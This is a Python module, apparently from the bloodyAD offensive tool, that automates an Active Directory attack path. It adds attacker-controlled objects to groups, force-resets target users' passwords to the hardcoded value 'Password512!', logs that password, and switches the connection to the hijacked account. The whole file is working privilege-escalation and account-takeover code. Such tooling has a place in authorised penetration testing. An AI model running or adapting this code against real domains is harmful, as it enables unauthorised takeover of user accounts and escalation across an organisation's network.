from bloodyAD import config, modules, utils

LOG = utils.LOG
class Automation:
    def __init__(self, args):
        self.conn = config.ConnectionHandler(args=args)
        self.rel_types = {
            0 : self._memberOf,
            1 : self._addMember,
            200 : self._forceChangePassword
        }
        self.dirty_laundry = []

    def exploit(self, path):
        for rel in path:
            print()
            typeID = rel['cost']
            self.rel_types[typeID](rel)
        self.conn.close()

    def _switchUser(self, user, pwd):
        for laundry in self.dirty_laundry:
            laundry['f'](self.conn, *laundry['args'])
        self.conn.switchUser(user, pwd)

    def _memberOf(self, rel):
        return
    
    # TODO: handle foreign object
    def _addMember(self, rel):
        member = rel['start_node']['objectid']
        group = rel['end_node']['distinguishedname']
        modules.addForeignObjectToGroup(self.conn, member, group)
        self.dirty_laundry.append({'f':modules.delObjectFromGroup, 'args':[member,group]})

    def _forceChangePassword(self, rel):
        user = rel['end_node']['name'].split('@')[0]
        pwd = 'Password512!'
        LOG.debug(f"[+] changing {user} password")
        modules.changePassword(self.conn, user, pwd)
        LOG.info(f"[+] password changed for to {pwd} for {user}")
        self._switchUser(user, pwd)
        LOG.debug(f"[+] switch LDAP/SAMR connection to user {user}")
